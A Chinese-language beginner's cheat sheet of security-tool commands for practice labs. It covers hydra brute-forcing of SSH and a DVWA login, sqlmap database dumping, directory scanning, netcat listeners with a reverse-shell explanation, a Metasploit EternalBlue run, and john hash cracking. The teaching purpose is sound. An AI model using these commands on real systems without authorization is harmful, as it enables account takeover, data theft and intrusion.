# 安全工具命令速查合集（复制即用）

> 全部只对自己的靶场用。每个工具记住"一条最常用命令"就够入门。

## hydra（爆破）

```bash
# SSH 爆破（只打自己的靶机）
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://靶机IP
# HTTP 表单爆破（DVWA 登录练习）
hydra -l admin -P 字典.txt 靶机IP http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```
字典：Kali 自带 `/usr/share/wordlists/rockyou.txt`（约 1400 万条）。

## sqlmap（SQL 注入）

```bash
sqlmap -u "URL?id=1" --cookie="security=low; PHPSESSID=xxx" --batch
sqlmap -u "URL?id=1" --cookie="..." --dbs            # 库
sqlmap -u "URL?id=1" --cookie="..." -D 库名 --tables  # 表
sqlmap -u "URL?id=1" --cookie="..." -D 库名 -T 表 --dump  # 数据
```
详细版见 [SQL注入进阶手册.md](15_SQL注入进阶手册.md)。

## 目录扫描（dirsearch / gobuster / ffuf，三选一）

```bash
dirsearch -u http://靶机IP -e php,txt,zip,bak     # 常用字典+常见后缀
gobuster dir -u http://靶机IP -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://靶机IP/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
用途：找后台、备份文件、隐藏目录（CTF 第 3 题的解法）。

## curl（命令行发请求）

```bash
curl -I http://靶机IP          # 只看响应头
curl -o 文件 地址               # 下载
curl -X POST -d "a=1" 地址      # POST 表单
curl -A "Mozilla/5.0" 地址     # 自定义 UA
```

## nc / netcat（瑞士军刀）

```bash
nc -lvnp 4444                    # 本机监听 4444
nc 目标IP 4444                   # 连过去
echo "hello" | nc 目标 80        # 手动发数据
```
概念（靶场用）：正向 shell = 目标开端口等你连；反向 shell = 目标主动连回你。原理搞清楚即可，别在非授权环境用。

## msfconsole / searchsploit（框架与漏洞库）

```bash
searchsploit 关键词             # 本地搜漏洞利用
msfconsole                       # 进框架
> search ms17_010                # 搜模块
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS 靶机IP
> run
```
配 [内网基础手册.md](26_内网基础手册.md) 的 MS17-010 实验。

## john / hashcat（哈希破解）

```bash
echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt   # 假设这是密码的 MD5
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt                                  # 看结果
```

## 速记优先级

第一周只要会用：**nmap、curl、hydra、dirsearch**。这四个覆盖 80% 的靶场任务。其余用到再查。
